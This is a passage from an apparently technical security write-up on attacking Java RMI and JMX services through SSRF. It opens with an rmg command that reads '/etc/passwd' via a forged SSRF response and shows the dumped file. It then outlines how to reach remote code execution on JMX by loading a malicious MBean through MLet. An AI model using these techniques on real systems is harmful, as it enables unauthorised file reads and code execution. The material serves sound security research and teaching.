$ rmg call 127.0.0.1 34985 '"/etc/passwd"' --signature 'byte[] read(String file)' --objid '[-622b5d41:17ddbb22e46:-7fff, 5804173508306632510]' --ssrf-response 4e00093132372e302e302e310000b1e651aced0005770f019dd4a2bf0000017ddbb22e468016757200025b42acf317f8060854e0020000707870000004d4726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f6173680a62696e3a783a313a313a62696e3a2f62696e3a2f7362696e2f6e6f6c6f67696e0a6461656d6f6e3a783a323a323a6461656d6f6e3a2f7362696e3a2f7362696e2f6e6f6c6f67696e0a61646d3a783a333a343a61646d3a2f7661722f61646d3a2f7362696e2f6e6f6c6f67696e0a6c703a783a343a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7362696e2f6e6f6c6f67696e0a73796e633a783a353a303a73796e633a2f7362696e3a2f62696e2f73796e630a73687574646f776e3a783a363a303a73687574646f776e3a2f7362696e3a2f7362696e2f73687574646f776e0a68616c743a783a373a303a68616c743a2f7362696e3a2f7362696e2f68616c740a6d61696c3a783a383a31323a6d61696c3a2f7661722f6d61696c3a2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a31333a6e6577733a2f7573722f6c69622f6e6577733a2f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31343a757563703a2f7661722f73706f6f6c2f757563707075626c69633a2f7362696e2f6e6f6c6f67696e0a6f70657261746f723a783a31313a303a6f70657261746f723a2f726f6f743a2f7362696e2f6e6f6c6f67696e0a6d616e3a783a31333a31353a6d616e3a2f7573722f6d616e3a2f7362696e2f6e6f6c6f67696e0a706f73746d61737465723a783a31343a31323a706f73746d61737465723a2f7661722f6d61696c3a2f7362696e2f6e6f6c6f67696e0a63726f6e3a783a31363a31363a63726f6e3a2f7661722f73706f6f6c2f63726f6e3a2f7362696e2f6e6f6c6f67696e0a6674703a783a32313a32313a3a2f7661722f6c69622f6674703a2f7362696e2f6e6f6c6f67696e0a737368643a783a32323a32323a737368643a2f6465762f6e756c6c3a2f7362696e2f6e6f6c6f67696e0a61743a783a32353a32353a61743a2f7661722f73706f6f6c2f63726f6e2f61746a6f62733a2f7362696e2f6e6f6c6f67696e0a73717569643a783a33313a33313a53717569643a2f7661722f63616368652f73717569643a2f7362696e2f6e6f6c6f67696e0a7866733a783a33333a33333a5820466f6e74205365727665723a2f6574632f5831312f66733a2f7362696e2f6e6f6c6f67696e0a67616d65733a783a33353a33353a67616d65733a2f7573722f67616d65733a2f7362696e2f6e6f6c6f67696e0a63797275733a783a38353a31323a3a2f7573722f63797275733a2f7362696e2f6e6f6c6f67696e0a76706f706d61696c3a783a38393a38393a3a2f7661722f76706f706d61696c3a2f7362696e2f6e6f6c6f67696e0a6e74703a783a3132333a3132333a4e54503a2f7661722f656d7074793a2f7362696e2f6e6f6c6f67696e0a736d6d73703a783a3230393a3230393a736d6d73703a2f7661722f73706f6f6c2f6d71756575653a2f7362696e2f6e6f6c6f67696e0a67756573743a783a3430353a3130303a67756573743a2f6465762f6e756c6c3a2f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f3a2f7362696e2f6e6f6c6f67696e0a6375726c5f757365723a783a3130303a3130313a4c696e757820557365722c2c2c3a2f686f6d652f6375726c5f757365723a2f7362696e2f6e6f6c6f67696e0a --plugin GenericPrint.jar | xxd -r -p
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
curl_user:x:100:101:Linux User,,,:/home/curl_user:/sbin/nologin
```


### Attacking JMX via *SSRF*

----

*JMX* is probably one of the most well known *RMI services* and is usually a reliable and easy target for attackers.
Instead of securing *JMX* services correctly with user authentication or client certificates, administrators often
take the easy route and prevent access to *JMX* services from untrusted networks. This makes *SSRF* attacks on *JMX*
endpoints and interesting topic, as it may allows to attack unreachable *JMX* endpoints. 

From the *SSRF* perspective, *JMX* is very similar to the custom *RMI service* discussed before. Despite being a well
known service, *JMX* endpoints do not have a fixed ``ObjID`` value. A ``lookup`` operation on the *RMI registry* is
therefore usually required to interact with the *JMX remote object*. Furthermore, there is one special characteristic
that we have not encountered so far and this is *session management*.

*JMX* supports password protected endpoints and needs therefore to implement *session management*. The *RMI protocol*
has no built in support for *session management*, but it is a common practice to use the ``ObjID`` mechanism for implicit
session management. We already said that custom *remote objects* get assigned a randomly generated ``ObjID`` value during
export and that clients are unable to use the *remote objects* without knowing their ``ObjID``. To make *remote objects*
publicly available, you bind them to an *RMI registry* service, but without doing this, the *remote object* can only be
accessed by clients that somehow obtained the ``ObjID`` value.

When a client wants to connect to a *JMX* service, it first looks up the corresponding bound name within the *RMI registry*.
The *remote object* that is returned by the registry implements the interface ``javax.management.remote.rmi.RMIServer``
and only supports two methods:

```java
public interface RMIServer extends Remote {
    public String getVersion() throws RemoteException;
    public RMIConnection newClient(Object credentials) throws IOException;
}
```

To interact with the *JMX* agent, clients need to obtain a *remote object* that implements the ``RMIConnection`` interface.
Such an object is returned when the client calls the ``newClient`` method and supplies the correct credentials. In this case,
the initial entry point object that implements the ``RMIServer`` interface exports a new *remote object* that implements the
``RMIConnection`` interface. Instead of binding the result to an *RMI registry* where it could be looked up by everyone, a
reference to the *remote object* is returned to the client that called the ``newClient`` method. The client is then the only
one who obtained the ``ObjID`` value for the new *remote object* and no other clients can interact with it. This demonstrates
how ``ObjID`` values can yield as a *session id* equivalent.

When targeting *JMX* services via *SSRF*, the *session management* adds one additional step during exploitation:

1. Lookup the *JMX* bound name from the *RMI registry*
2. Call the ``newClient`` method to establish a *JMX* session
3. Use the *JMX* session to achieve *RCE*
    * Create the *MLet MBean*
    * Use *MLet* to load a malicious *MBean*
    * Use the malicious *MBean* to achieve *RCE*

Notice that the third step needs to be executed in a short time interval after the second step. After obtaining a reference
to the *remote object* that implements the ``RMIConnection`` interface, a real client would send a corresponding notification
to the *Distributed Garbage Collector* (*DGC*). This informs the *DGC* that the corresponding *remote object* is in use and
should not be cleaned up. Since we obtain the reference via *SSRF*, there is no communication to the *DGC*. Shortly after the
``newClient`` call has generated the new *remote object*, it will be cleaned up by the *DGC*. Therefore, we need to be fast to
communicate to it.


### References

----

* \[1\] [Exploiting Tiny Tiny RSS](https://www.digeex.de/blog/tinytinyrss/)
* \[2\] [remote-method-guesser (GitHub)](https://github.com/qtc-de/remote-method-guesser)
* \[3\] [ssrf-example-server (GitHub)](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server)
